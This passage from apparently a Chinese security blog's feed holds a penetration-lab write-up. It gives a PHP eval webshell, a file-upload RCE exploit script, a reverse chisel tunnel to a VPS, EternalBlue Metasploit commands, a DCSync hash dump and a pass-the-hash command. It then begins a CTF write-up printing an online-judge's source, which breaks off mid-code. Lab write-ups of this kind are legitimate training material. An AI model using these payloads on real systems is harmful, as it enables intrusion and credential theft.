NetBios <span class="token number">172.22</span>.1.2      <span class="token punctuation">[</span>+<span class="token punctuation">]</span> DC:DC01.xiaorang.lab             Windows Server <span class="token number">2016</span> Datacenter <span class="token number">14393</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> OsInfo <span class="token number">172.22</span>.1.2    <span class="token punctuation">(</span>Windows Server <span class="token number">2016</span> Datacenter <span class="token number">14393</span><span class="token punctuation">)</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetBios <span class="token number">172.22</span>.1.21     XIAORANG-WIN7.xiaorang.lab          Windows Server <span class="token number">2008</span> R2 Enterprise <span class="token number">7601</span> Service Pack <span class="token number">1</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetBios <span class="token number">172.22</span>.1.18     XIAORANG-OA01.xiaorang.lab          Windows Server <span class="token number">2012</span> R2 Datacenter <span class="token number">9600</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://172.22.1.15        code:200 len:5578   title:Bootstrap Material Admin<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://172.22.1.18        code:302 len:0      title:None 跳转url: http://172.22.1.18?m<span class="token operator">=</span>login<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://172.22.1.18?m<span class="token operator">=</span>login code:200 len:4012   title:信呼协同办公系统<span class="token punctuation">[</span>+<span class="token punctuation">]</span> PocScan http://172.22.1.15 poc-yaml-thinkphp5023-method-rce poc1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h1><p>用 chisel 建立内网隧道方便本地进行内网资源访问</p><p>在vps上运行：(记得安全组策略开端口)</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./chisel server <span class="token parameter variable">-p</span> <span class="token number">33322</span> <span class="token parameter variable">--reverse</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在这台已经getshell的机器上运行：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./chisel client vpsip:33322 R:0.0.0.0:44543:socks<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/image-20250224120820231.png" alt="image-20250224120820231"></p><p>然后连接 vps:44543 的 socks5 代理</p><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/image-20250224120942648.png" alt="image-20250224120942648"></p><p>最后即可在本地访问内网资源：</p><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/image-20250224121044357.png" alt="image-20250224121044357"></p><hr><h1 id="信呼nday"><a href="#信呼nday" class="headerlink" title="信呼nday"></a>信呼nday</h1><p>首先要在 kali 上也建立一下socks5访问</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /etc/proxychains4.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/image-20250224121351479.png" alt="image-20250224121351479"></p><p>信呼v2.2.8，搜一下有：<a href="https://github.com/Threekiii/Awesome-POC/blob/master/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E4%BF%A1%E5%91%BCOA%20qcloudCosAction.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md">https://github.com/Threekiii/Awesome-POC/blob/master/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E4%BF%A1%E5%91%BCOA%20qcloudCosAction.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md</a></p><p>先尝试爆破账密，bp也记得挂socks代理，然后浏览器走bp代理就能套代理了，得到 admin:admin123</p><p>那么上传1.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/image-20250224122514619.png" alt="image-20250224122514619"></p><p>拿到现在的 fileid 为 10，下一个文件就是11了</p><p>那么同样的操作在 kali 上准备一个 1.php</p><p>同目录下准备 poc 脚本：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 1.php为webshell</span><span class="token comment"># 需要修改以下内容：</span><span class="token comment"># url_pre = 'http://&lt;IP>/'</span><span class="token comment"># 'adminuser': '&lt;ADMINUSER_BASE64>',</span><span class="token comment"># 'adminpass': '&lt;ADMINPASS_BASE64>',</span><span class="token keyword">import</span> requestssession <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>url_pre <span class="token operator">=</span> <span class="token string">'http://172.22.1.18/'</span>url1 <span class="token operator">=</span> url_pre <span class="token operator">+</span> <span class="token string">'?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953'</span>url2 <span class="token operator">=</span> url_pre <span class="token operator">+</span> <span class="token string">'/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913'</span>url3 <span class="token operator">=</span> url_pre <span class="token operator">+</span> <span class="token string">'/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=11'</span>data1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">'rempass'</span><span class="token punctuation">:</span> <span class="token string">'0'</span><span class="token punctuation">,</span>    <span class="token string">'jmpass'</span><span class="token punctuation">:</span> <span class="token string">'false'</span><span class="token punctuation">,</span>    <span class="token string">'device'</span><span class="token punctuation">:</span> <span class="token string">'1625884034525'</span><span class="token punctuation">,</span>    <span class="token string">'ltype'</span><span class="token punctuation">:</span> <span class="token string">'0'</span><span class="token punctuation">,</span>    <span class="token string">'adminuser'</span><span class="token punctuation">:</span> <span class="token string">'YWRtaW4='</span><span class="token punctuation">,</span>    <span class="token string">'adminpass'</span><span class="token punctuation">:</span> <span class="token string">'YWRtaW4xMjM='</span><span class="token punctuation">,</span>    <span class="token string">'yanzm'</span><span class="token punctuation">:</span> <span class="token string">''</span>    <span class="token punctuation">&#125;</span>r <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url1<span class="token punctuation">,</span> data<span class="token operator">=</span>data1<span class="token punctuation">)</span>r <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url2<span class="token punctuation">,</span> files<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'file'</span><span class="token punctuation">:</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'1.php'</span><span class="token punctuation">,</span> <span class="token string">'r+'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>filepath <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'filepath'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>filepath <span class="token operator">=</span> <span class="token string">"/"</span> <span class="token operator">+</span> filepath<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.uptemp'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">'.php'</span><span class="token keyword">print</span><span class="token punctuation">(</span>filepath<span class="token punctuation">)</span><span class="token builtin">id</span> <span class="token operator">=</span> r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span>url3 <span class="token operator">=</span> url_pre <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f'/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">id</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span>r <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url3<span class="token punctuation">)</span>r <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url_pre <span class="token operator">+</span> filepath <span class="token operator">+</span> <span class="token string">"?1=system('dir');"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后运行</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains4 python3 poc.py <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/image-20250224122842289.png" alt="image-20250224122842289"></p><p>访问写马的目录看看</p><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/image-20250224122943638.png" alt="image-20250224122943638"></p><p>成功getshell了，是 system 权限</p><p>接下来在蚁剑上同样配置socks代理进行连接</p><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/image-20250224123150450.png" alt="image-20250224123150450"></p><p>连马找flag</p><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/image-20250224123320660.png" alt="image-20250224123320660"></p><p>flag02: <code>2ce3-4813-87d4-</code></p><hr><h1 id="MS17-010-amp-DCSync"><a href="#MS17-010-amp-DCSync" class="headerlink" title="MS17-010 &amp; DCSync"></a>MS17-010 &amp; DCSync</h1><p>接下来打内网的 MS17-010 服务器，这个搜一下可以知道是永恒之蓝</p><p>msf上有，遂直接一把梭，参考：<a href="https://blog.csdn.net/ElsonHY/article/details/109939420">https://blog.csdn.net/ElsonHY/article/details/109939420</a></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains4 msfconsolesearch ms17-010<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/image-20250224124336985.png" alt="image-20250224124336985"></p><p>直接打了</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use exploit/windows/smb/ms17_010_eternalblue<span class="token builtin class-name">set</span> payload windows/x64/meterpreter/bind_tcp_uuid<span class="token builtin class-name">set</span> RHOSTS <span class="token number">172.22</span>.1.21exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/image-20250224124850453.png" alt="image-20250224124850453"></p><p>拿到权限后可以用 creds_all 等命令收集内网凭据，而我们控制的这台机器是有 DCSync 的权限的(因为这个是DC1，也就是域控制器)，所以能直接从域控上导出Hash</p><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/image-20250224125846463.png" alt="image-20250224125846463"></p><blockquote><p><strong>DCSync攻击:</strong><br>DCSync的原理是利用域控制器之间的数据同步复制<br>DCSync是AD域渗透中常用的凭据窃取手段，默认情况下，域内不同DC每隔15分钟会进行一次数据同步，当一个DC从另外一个DC同步数据时，发起请求的一方会通过目录复制协议（MS-  DRSR）来对另外一台域控中的域用户密码进行复制，DCSync就是利用这个原理，“模拟”DC向真实DC发送数据同步请求，获取用户凭据数据，由于这种攻击利用了Windows RPC协议，并不需要登陆域控或者在域控上落地文件，避免触发EDR告警，因此DCSync时一种非常隐蔽的凭据窃取方式</p></blockquote><blockquote><p><strong>DCSync 攻击前提:</strong><br>想进行DCSync 攻击，必须获得以下任一用户的权限：<br>Administrators 组内的用户<br>Domain Admins 组内的用户<br>Enterprise Admins 组内的用户域控制器的计算机帐户<br>即：默认情况下域管理员组具有该权限</p></blockquote><p>这里我们用永恒之蓝打完本来就是 system 权限，然后我们<code>load kiwi</code>启用猕猴桃，抓取用户的hash</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">load kiwikiwi_cmd <span class="token string">"lsadump::dcsync /domain:xiaorang.lab /all /csv"</span> <span class="token builtin class-name">exit</span><span class="token comment"># 导出域内所有用户的信息，包括哈希值</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/image-20250224125323059.png" alt="image-20250224125323059"></p><p>抓到了 Administrator 的 hash，之前扫出来 .2 的 445 端口开放，利用 smb 哈希传递，直接用 kali 自带的 crackmapexec，参考：<a href="https://blog.csdn.net/qq_42077227/article/details/130279040">https://blog.csdn.net/qq_42077227/article/details/130279040</a></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains4 crackmapexec smb <span class="token number">172.22</span>.1.2 <span class="token parameter variable">-u</span> administrator <span class="token parameter variable">-H10cf89a850fb1cdbe6bb432b859164c8</span> <span class="token parameter variable">-d</span> xiaorang.lab <span class="token parameter variable">-x</span> <span class="token string">"type Users\Administrator<span class="token entity" title="\f">\f</span>lag<span class="token entity" title="\f">\f</span>lag03.txt"</span><span class="token comment"># -d指定域登录，-x要执行的命令</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/image-20250224132226932.png" alt="image-20250224132226932"></p><p>flag03: <code>e8f88d0d43d6&#125;</code></p><p>flag：<code>flag&#123;60b53231-2ce3-4813-87d4-e8f88d0d43d6&#125;</code></p><p>花了两小时打完，有点累，但是挺爽的</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;感谢 &lt;a href=&quot;https://dexterjie.github.io/&quot;&gt;@Dexterjie&lt;/a&gt; 快过期的沙砾支持&lt;/p&gt;
&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://fushuling.com/index.php/2023/08/27/%e6%98%a5%e7%a7%8b%e4%ba%91%e5%a2%83%c2%b7initial/&quot;&gt;https://fushuling.com/index.php/2023/08/27/%e6%98%a5%e7%a7%8b%e4%ba%91%e5%a2%83%c2%b7initial/&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="渗透" scheme="http://c1oudfl0w0.github.io/blog/categories/%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>AliyunCTF2025</title>
    <link href="http://c1oudfl0w0.github.io/blog/2025/02/22/AliyunCTF2025/"/>
    <id>http://c1oudfl0w0.github.io/blog/2025/02/22/AliyunCTF2025/</id>
    <published>2025-02-22T05:42:04.000Z</published>
    <updated>2025-02-24T17:45:42.162Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>参考：</p><p><a href="https://blog.xmcve.com/2025/02/25/%E9%98%BF%E9%87%8C%E4%BA%91CTF2025-Writeup">https://blog.xmcve.com/2025/02/25/%E9%98%BF%E9%87%8C%E4%BA%91CTF2025-Writeup</a></p><p><a href="https://xz.aliyun.com/news/17029">https://xz.aliyun.com/news/17029</a></p><span id="more"></span><hr><h1 id="ezoj"><a href="#ezoj" class="headerlink" title="ezoj"></a>ezoj</h1><p>&#x2F;source 获取源码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> subprocess<span class="token keyword">import</span> uuid<span class="token keyword">import</span> json<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> jsonify<span class="token punctuation">,</span> send_file<span class="token keyword">from</span> pathlib <span class="token keyword">import</span> Pathapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>SUBMISSIONS_PATH <span class="token operator">=</span> Path<span class="token punctuation">(</span><span class="token string">"./submissions"</span><span class="token punctuation">)</span>PROBLEMS_PATH <span class="token operator">=</span> Path<span class="token punctuation">(</span><span class="token string">"./problems"</span><span class="token punctuation">)</span>SUBMISSIONS_PATH<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>parents<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> exist_ok<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>CODE_TEMPLATE <span class="token operator">=</span> <span class="token triple-quoted-string string">"""import sysimport mathimport collectionsimport queueimport heapqimport bisectdef audit_checker(event,args):    if not event in ["import","time.sleep","builtins.input","builtins.input/result"]:        raise RuntimeErrorsys.addaudithook(audit_checker)"""</span><span class="token keyword">class</span> <span class="token class-name">OJTimeLimitExceed</span><span class="token punctuation">(</span>Exception<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span><span class="token keyword">class</span> <span class="token class-name">OJRuntimeError</span><span class="token punctuation">(</span>Exception<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> send_file<span class="token punctuation">(</span><span class="token string">"static/index.html"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/source"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">source</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> send_file<span class="token punctuation">(</span><span class="token string">"server.py"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/api/problems"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">list_problems</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    problems_dir <span class="token operator">=</span> PROBLEMS_PATH    problems <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> problem <span class="token keyword">in</span> problems_dir<span class="token punctuation">.</span>iterdir<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        problem_config_file <span class="token operator">=</span> problem <span class="token operator">/</span> <span class="token string">"problem.json"</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> problem_config_file<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        problem_config <span class="token operator">=</span> json<span class="token punctuation">.</span>load<span class="token punctuation">(</span>problem_config_file<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        problem <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"problem_id"</span><span class="token punctuation">:</span> problem<span class="token punctuation">.</span>name<span class="token punctuation">,</span>            <span class="token string">"name"</span><span class="token punctuation">:</span> problem_config<span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token string">"description"</span><span class="token punctuation">:</span> problem_config<span class="token punctuation">[</span><span class="token string">"description"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span>        problems<span class="token punctuation">.</span>append<span class="token punctuation">(</span>problem<span class="token punctuation">)</span>    problems <span class="token operator">=</span> <span class="token builtin">sorted</span><span class="token punctuation">(</span>problems<span class="token punctuation">,</span> key<span class="token operator">=</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> x<span class="token punctuation">[</span><span class="token string">"problem_id"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    problems <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"problems"</span><span class="token punctuation">:</span> problems<span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span>problems<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/api/submit"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">submit_code</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> request<span class="token punctuation">.</span>get_json<span class="token punctuation">(</span><span class="token punctuation">)</span>        code <span class="token operator">=</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"code"</span><span class="token punctuation">)</span>        problem_id <span class="token operator">=</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"problem_id"</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> code <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">or</span> problem_id <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token punctuation">(</span>                jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"status"</span><span class="token punctuation">:</span> <span class="token string">"ER"</span><span class="token punctuation">,</span> <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Missing 'code' or 'problem_id'"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token number">400</span><span class="token punctuation">,</span>            <span class="token punctuation">)</span>        problem_id <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>problem_id<span class="token punctuation">)</span><span class="token punctuation">)</span>        problem_dir <span class="token operator">=</span> PROBLEMS_PATH <span class="token operator">/</span> problem_id        <span class="token keyword">if</span> <span class="token keyword">not</span> problem_dir<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token punctuation">(</span>                jsonify<span class="token punctuation">(</span>                    <span class="token punctuation">&#123;</span><span class="token string">"status"</span><span class="token punctuation">:</span> <span class="token string">"ER"</span><span class="token punctuation">,</span> <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"Problem ID </span><span class="token interpolation"><span class="token punctuation">&#123;</span>problem_id<span class="token punctuation">&#125;</span></span><span class="token string"> not found!"</span></span><span class="token punctuation">&#125;</span>                <span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token number">404</span><span class="token punctuation">,</span>            <span class="token punctuation">)</span>        code_filename <span class="token operator">=</span> SUBMISSIONS_PATH <span class="token operator">/</span> <span class="token string-interpolation"><span class="token string">f"submission_</span><span class="token interpolation"><span class="token punctuation">&#123;</span>uuid<span class="token punctuation">.</span>uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">.py"</span></span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>code_filename<span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> code_file<span class="token punctuation">:</span>            code <span class="token operator">=</span> CODE_TEMPLATE <span class="token operator">+</span> code            code_file<span class="token punctuation">.</span>write<span class="token punctuation">(</span>code<span class="token punctuation">)</span>        result <span class="token operator">=</span> judge<span class="token punctuation">(</span>code_filename<span class="token punctuation">,</span> problem_dir<span class="token punctuation">)</span>        code_filename<span class="token punctuation">.</span>unlink<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span>result<span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"status"</span><span class="token punctuation">:</span> <span class="token string">"ER"</span><span class="token punctuation">,</span> <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">500</span><span class="token keyword">def</span> <span class="token function">judge</span><span class="token punctuation">(</span>code_filename<span class="token punctuation">,</span> problem_dir<span class="token punctuation">)</span><span class="token punctuation">:</span>    test_files <span class="token operator">=</span> <span class="token builtin">sorted</span><span class="token punctuation">(</span>problem_dir<span class="token punctuation">.</span>glob<span class="token punctuation">(</span><span class="token string">"*.input"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    total_tests <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>test_files<span class="token punctuation">)</span>    passed_tests <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> test_file <span class="token keyword">in</span> test_files<span class="token punctuation">:</span>            input_file <span class="token operator">=</span> test_file            expected_output_file <span class="token operator">=</span> problem_dir <span class="token operator">/</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>test_file<span class="token punctuation">.</span>stem<span class="token punctuation">&#125;</span></span><span class="token string">.output"</span></span>            <span class="token keyword">if</span> <span class="token keyword">not</span> expected_output_file<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">continue</span>            case_passed <span class="token operator">=</span> run_code<span class="token punctuation">(</span>code_filename<span class="token punctuation">,</span> input_file<span class="token punctuation">,</span> expected_output_file<span class="token punctuation">)</span>            <span class="token keyword">if</span> case_passed<span class="token punctuation">:</span>                passed_tests <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token keyword">if</span> passed_tests <span class="token operator">==</span> total_tests<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"status"</span><span class="token punctuation">:</span> <span class="token string">"AC"</span><span class="token punctuation">,</span> <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"Accepted"</span></span><span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token punctuation">&#123;</span>                <span class="token string">"status"</span><span class="token punctuation">:</span> <span class="token string">"WA"</span><span class="token punctuation">,</span>                <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"Wrang Answer: pass(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>passed_tests<span class="token punctuation">&#125;</span></span><span class="token string">/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>total_tests<span class="token punctuation">&#125;</span></span><span class="token string">)"</span></span><span class="token punctuation">,</span>            <span class="token punctuation">&#125;</span>    <span class="token keyword">except</span> OJRuntimeError <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"status"</span><span class="token punctuation">:</span> <span class="token string">"RE"</span><span class="token punctuation">,</span> <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"Runtime Error: ret=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">.</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">&#125;</span>    <span class="token keyword">except</span> OJTimeLimitExceed<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"status"</span><span class="token punctuation">:</span> <span class="token string">"TLE"</span><span class="token punctuation">,</span> <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Time Limit Exceed"</span><span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">run_code</span><span class="token punctuation">(</span>code_filename<span class="token punctuation">,</span> input_file<span class="token punctuation">,</span> expected_output_file<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>input_file<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> 